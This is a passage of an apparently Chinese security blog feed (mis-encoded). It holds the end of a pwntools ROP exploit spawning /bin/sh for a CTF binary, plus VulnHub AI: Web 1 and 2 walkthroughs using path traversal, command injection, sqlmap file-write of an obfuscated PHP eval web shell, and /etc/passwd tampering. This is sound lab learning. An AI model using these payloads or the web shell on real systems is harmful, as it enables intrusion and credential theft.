punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input new content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>bss<span class="token operator">=</span><span class="token number">0x527000</span><span class="token operator">+</span><span class="token number">0x2000</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000462946</span>rsi_rsp_0xf8_rbp<span class="token operator">=</span><span class="token number">0x0000000000462552</span>rdx<span class="token operator">=</span><span class="token number">0x000000000047a8fa</span>rax_rbp<span class="token operator">=</span><span class="token number">0x0000000000404408</span>syscall<span class="token operator">=</span><span class="token number">0x000000000040316C</span>sadd<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x000000000047F41E'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rax_rbp<span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'note'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchçš„è¯ï¼ŒæŠŠå¾ªç¯æ”¹æˆå®šå€¼å°±è¿‡checkäº†<br><img src="/EXP_FILE/e148411ef445b5c558fb60fb7ef80bb4_MD5.jpeg"></p><h1 id="staticlink"><a href="#staticlink" class="headerlink" title="staticlink"></a>staticlink</h1><p>æˆ‘æ˜¯æ‡’ç‹—ï¼Œæ‡’å¾—çœ‹äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èµ›é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_2</title>
      <link href="/2024/06/06/Easy-AI_Web_2/"/>
      <url>/2024/06/06/Easy-AI_Web_2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p></blockquote><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p><p>æ˜¯ä¸ªç™»å½•ç•Œé¢<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>å¯ä»¥æ³¨å†Œè¿›å»<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharingï¼Ÿæœç´¢ä¸€ä¸‹æœ‰ç›®å½•éå†<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™è¾¹æ‰«ä¸‹ç›®å½•ï¼Œæ­£å¥½æ‰«åˆ°ä¸€ä¸ªdownload.phpï¼Œç›´æ¥åˆ©ç”¨</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>æˆåŠŸè§¦å‘</p><p>ä½†æ˜¯ä¸èƒ½è¯»å–&#x2F;etc&#x2F;shadowï¼Œid_rsaä¹Ÿä¸è¡Œ</p><p>æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæœ‰ä¸€ä¸ª&#x2F;webadmin&#x2F;éœ€è¦å¯†ç <br><img src="/Rxi134_FILE/bec81bac25c350fa5a530054d13bbe3d_MD5.jpeg"></p><p>è¿™ä¸ªæœåŠ¡å™¨æ˜¯Apache HTTP Serverï¼Œå…è®¸ä½¿ç”¨ HTTP èº«ä»½éªŒè¯ï¼Œå¯†ç æ–‡ä»¶ä½äº<code>/etc/apache2/.htpasswd</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å±äºmd5ï¼Œjohnç ´è§£å‡ºhash<br><img src="/Rxi134_FILE/7419798ceec3ad0112281f72729c3a5d_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:c.ronaldo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç™»å½•è¿›å…¥&#x2F;webadmin&#x2F;<br><img src="/Rxi134_FILE/27fbb8a153d352c15422b4c420687aaf_MD5.jpeg"></p><p>æ”¾ä¸Šcookieç»§ç»­æ‰«ï¼Œèƒ½è®¿é—®åˆ°robots.txt<br><img src="/Rxi134_FILE/f358315b7e90455658ff374606383458_MD5.jpeg"></p><p>è®¿é—®&#x2F;webadmin&#x2F;H05Tpin9555&#x2F;ï¼Œå®ç°äº†pingåŠŸèƒ½<br><img src="/Rxi134_FILE/a39c6ceff9e50aaf13161385404d1f61_MD5.jpeg"></p><p>å°è¯•å‘½ä»¤æ‰§è¡Œï¼Œå‘ç° || å¯ä»¥ç»•è¿‡<br><img src="/Rxi134_FILE/5295f88ef31eb5b041714694407a4b41_MD5.jpeg"><br>ç»è¿‡å°è¯•ï¼Œè¿‡æ»¤äº†<code>&amp; ; -</code></p><p>æˆ‘ä»¬å¤„äº<code>/var/www/html/webadmin/H05Tpin9555</code>ç›®å½•ä¸‹ï¼Œç”¨æˆ·ä¸º www-data</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/var/www/html/webadmin/H05Tpin9555</span>index.phpstyle-main.css<span class="token comment">#/var/www/html/webadmin/S0mextras</span>index.html<span class="token comment">#/var/www/html/webadmin/</span>H05Tpin9555S0mextrasindex.htmlrobots.txt<span class="token comment">#/var/www/html/</span>cssdeleting.phpdownload.phpindex.phplogout.phpsignup.phpsrvuserpage.phpviewing.phpwebadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„</p><p>å¡ä½äº†ï¼ŒæŸ¥çœ‹wpï¼Œæœ‰éšè—æ–‡ä»¶ï¼Œä½†æ˜¯<code>-</code>è¢«è¿‡æ»¤äº†ä¸èƒ½ä½¿ç”¨ ls -a</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1 <span class="token operator">||</span> <span class="token function">ls</span> <span class="token punctuation">..</span>/S0mextras/.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±å¯ä»¥çœ‹åˆ°éšè—æ–‡ä»¶äº†<br><img src="/Rxi134_FILE/cd36ef267539b9b3147784a9fe5f1760_MD5.jpeg"></p><p>è¿™æ˜¯å…¶ä¸­ä¸€ä¸ªç”¨æˆ·çš„è´¦å¯†<br><img src="/Rxi134_FILE/f5a521171b4a7f2fe287b9d4021a4eef_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User: n0nr00tuserCred: zxowieoi4sdsadpEClDws1sf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/6e56723323db67af7d4463aad8e44647_MD5.jpeg"></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>å…ˆåå¼¹åˆ°meterpreterå§</p><p>æ²¡æ‰¾åˆ°å¥½ç”¨çš„ï¼Œfrpè½¬å‘ä¸‹ç«¯å£ï¼Œubuntu18 ç›´æ¥pwnkitä¸€æŠŠå—¦<br><img src="/Rxi134_FILE/d7c0404ee4304956624af50b1b47c0e8_MD5.jpeg"><br><img src="/Rxi134_FILE/fa8ba88e130e5ac0efd4dcc1b02ea409_MD5.jpeg"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡è¯¥é¶æœºï¼Œæˆ‘å­¦ä¹ åˆ°äº†</p><ul><li>æ›´åŠ æ·±å…¥çš„ç†è§£äº†msf</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_1</title>
      <link href="/2024/06/05/Easy-AI_Web_1/"/>
      <url>/2024/06/05/Easy-AI_Web_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p></blockquote><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>é¢å¤–è®¾ç½®äº†ä¸ªè·³æ¿æœºï¼Œæ›´æ¥è¿‘ç°å®<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>æ‰«ä¸‹ç«¯å£<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p><p>è®¿é—®ç½‘ç«™é¡µé¢ï¼Œåªæœ‰ä¸€è¡Œå­—<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p><p>dirsearchæ‰«ç›®å½•åªæ‰«å‡ºä¸ª&#x2F;robots.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®éƒ½æ˜¯403ï¼Œæ‹¿ç€ &#x2F;m3diNf0&#x2F; å’Œ &#x2F;se3reTdir777&#x2F; ç»§ç»­æ‰«</p><p>æ‰«åˆ°  &#x2F;m3diNf0&#x2F;info.phpï¼Œæ˜¯ä¸€ä¸ªphpinfoç•Œé¢<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>è¿™æ—¶å€™æƒ³äº†ä¸€ä¸‹ä¼šä¸ä¼šæœ‰XXEï¼Œä½†æ˜¯libxml 2.9.4é»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p><p>æ‰«  &#x2F;se3reTdir777&#x2F; åªæœ‰ä¸€ä¸ªindex.php<br><img src="/Rxi134_FILE/20223847dc332295b9557c3db09dfd12_MD5.jpeg"><br>è¿™åƒæ˜¯ä¸€ä¸ªé€šè¿‡IDæŸ¥è¯¢ç”¨æˆ·çš„ç³»ç»Ÿ<br><img src="/Rxi134_FILE/f450c481b54ad47b43c0c91ecfdd8de1_MD5.jpeg"></p><p>ä¸æ•°æ®åº“æœ‰äº¤é›†ï¼Œè¯•è¯•çœ‹æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹<br><img src="/Rxi134_FILE/0cd126a50fdd43a0923edea5fbcc2f46_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">available databases [2]:[*] aiweb1[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Database: aiweb1[2 tables]+------------+| user       || systemUser |+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Table: user[3 entries]+----+----------+-----------+| id | lastName | firstName |+----+----------+-----------+| 1  | admin    | admin     || 2  | root     | root      || 3  | mysql    | mysql     |+----+----------+-----------++----+----------------------------------------------+-----------+| id | password                                     | userName  |+----+----------------------------------------------+-----------+| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      || 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn || 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |+----+----------------------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64è§£ç ä¸º</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">FakeUserPassw0rdMyEvilPass_f908sdaf9_sadfasf0saN0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¿™ä¸ªç”¨æˆ·æœ‰FILEæƒé™<br><img src="/Rxi134_FILE/b3a8df81fe3d1eb20547bb74b882433e_MD5.jpeg"></p><p>è¦å†™é©¬å¾—è·å–ç»å¯¹è·¯å¾„ï¼Œä¸€å¼€å§‹æƒ³sql shellæ‰§è¡ŒSQLè¯­å¥ä½†å¥½åƒæ²¡è¿™ä¸ªæƒé™ï¼Œä¸è¿‡å‰é¢çš„phpinfoç•Œé¢å¯ä»¥ç›´æ¥çœ‹åˆ°ç»å¯¹è·¯å¾„<br><img src="/Rxi134_FILE/45453dd1d872d71972c09c5a83632bbe_MD5.jpeg"></p><p>æœ‰æƒé™å†™çš„ä½ç½®åªæœ‰ &#x2F;se3reTdir777&#x2F;uploads</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token string">"C:\Penetration<span class="token entity" title="\E">\E</span>xploitTools\Tools\Sqlmap\sqlmap.py"</span> <span class="token parameter variable">-r</span> <span class="token string">"C:\Users\ANONYM~1\AppData\Local\Temp<span class="token entity" title="\\">\\</span>192_168_50_137_80_20240802173240.req"</span> --file-write <span class="token string">"C:\Users\Anonymous\Desktop<span class="token entity" title="\202">\202</span>40802053947.php"</span> --file-dest <span class="token string">"/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">GZ0lOZtq</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$H2qZ4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*Z#ï¿½ï¿½h*u@!h4g126854T*/"</span><span class="token operator">.</span><span class="token variable">$H2qZ4</span><span class="token operator">.</span><span class="token string double-quoted-string">"/*Z#ï¿½ï¿½h*u@!h4g126854T*/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">GZ0lOZtq</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hh'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>èšå‰‘è¿æ¥å³å¯<br><img src="/Rxi134_FILE/29dd7c51e3681c1c77d3f4b07a7c9b86_MD5.jpeg"></p><p>åœ¨ç›®å½•ä¸‹åˆå‘ç°ä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„æ–‡ä»¶<br><img src="/Rxi134_FILE/b93740173bc90fc25e9f1ce48c97dbfa_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">æ•°æ®åº“åœ°å€ localhostè´¦å¯† aiweb1user:wGuDisZiTkLhuiH_z_zZQXXiæ•°æ®åº“åç§° aiweb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>å…ˆåå¼¹ shell åˆ°è·³æ¿æœºä¸Šï¼Œæˆ‘ç”¨çš„æ˜¯frpåå‘ä»£ç†<br><img src="/Rxi134_FILE/cb7046293b85207636403285a4e46edc_MD5.jpeg"></p><p><img src="/Rxi134_FILE/9aff13a14073a24ba411dd1cfeda2acb_MD5.jpeg"></p><p>èµ·ä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œæ–¹ä¾¿å›æ˜¾</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥æ­£å¸¸ç™»å½•mysql<br><img src="/Rxi134_FILE/fde2063f2d5db55cec9646e9af77a0d8_MD5.jpeg"></p><p>è¿›è¡Œä¸€äº›ä¿¡æ¯æœé›†ï¼Œä¸Šlineas<br><img src="/Rxi134_FILE/c5784084ac53b01ea3d8577239d190ab_MD5.jpeg"></p><p>æœ¬ç”¨æˆ·å¯¹ &#x2F;etc&#x2F;passwd æœ‰å†™æƒé™<br><img src="/Rxi134_FILE/bf11baf48105c308ba73a35040d28755_MD5.jpeg"><br>åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·x1nriï¼Œå¯†ç ä¸º123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> x1nri <span class="token number">123</span><span class="token variable">$1</span><span class="token variable">$x1nri</span><span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é‚£ä¹ˆpasswdæ¡ç›®ä¸º</p><pre class="line-numbers language-text" data-language="text"><code 